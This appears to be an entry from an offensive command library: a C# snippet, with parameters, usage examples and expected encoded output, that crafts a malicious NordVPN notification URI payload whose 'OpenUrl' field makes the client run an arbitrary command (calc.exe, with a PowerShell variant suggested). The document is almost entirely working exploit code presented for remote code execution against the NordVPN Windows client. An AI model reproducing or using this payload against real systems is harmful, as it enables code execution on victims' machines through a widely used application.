---
data: >-
  using System; using System.Collections.Generic; using Newtonsoft.Json; using
  NordVpn.Core; Dictionary<string,string> arguments = new
  Dictionary<string,string>(); arguments["OpenUrl"]="calc.exe";
  NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments);
  String exploit = ObjectCompressor.CompressObject(toastArgs);
  Console.Write(String.Format("NordVPN.Notification:{0}", exploit));
  Console.ReadKey();
tags:
  - rce
  - payload-generation
type: command
executor: csharp
platforms:
  - Windows
id: 34827cfa-e07e-4c71-9b3c-3694c02332d1
created_at: '2025-12-14T17:24:08.495Z'
updated_at: '2025-12-14T17:24:08.495Z'
verified: false
validated: true
submitted: true
---
# generate-nordvpn-malicious-payload

## Command

```csharp
using System; using System.Collections.Generic; using Newtonsoft.Json; using NordVpn.Core; Dictionary<string,string> arguments = new Dictionary<string,string>(); arguments["OpenUrl"]="calc.exe"; NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments); String exploit = ObjectCompressor.CompressObject(toastArgs); Console.Write(String.Format("NordVPN.Notification:{0}", exploit)); Console.ReadKey();
```

## Description

This C# command crafts a malicious notification payload for NordVPN's URI scheme by creating a dictionary with an 'OpenUrl' key set to a command (e.g., 'calc.exe'), wrapping it in NotificationActionArgs, compressing it with ObjectCompressor, and outputting the URI-formatted string. Use it to generate payloads for RCE exploitation in the NordVPN client.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `OpenUrl` | The command to execute via Process.Start (e.g., 'calc.exe') | Yes |
| `NotificationActionArgs` | Constructor with empty action string and arguments dictionary | Yes |

## Examples

### Basic Usage

```csharp
Dictionary<string,string> arguments = new Dictionary<string,string>(); arguments["OpenUrl"]="calc.exe"; NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments); String exploit = ObjectCompressor.CompressObject(toastArgs); Console.Write(String.Format("NordVPN.Notification:{0}", exploit));
```

### Advanced Usage

Replace 'calc.exe' with another command, e.g., 'powershell.exe -c malicious-script.ps1':

```csharp
arguments["OpenUrl"]="powershell.exe -c Get-Process";
```

## Expected Output

NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA (or similar compressed base64 string).

## Related

- [[procedures/Craft-Malicious-NordVPN-Notification-Payload]]
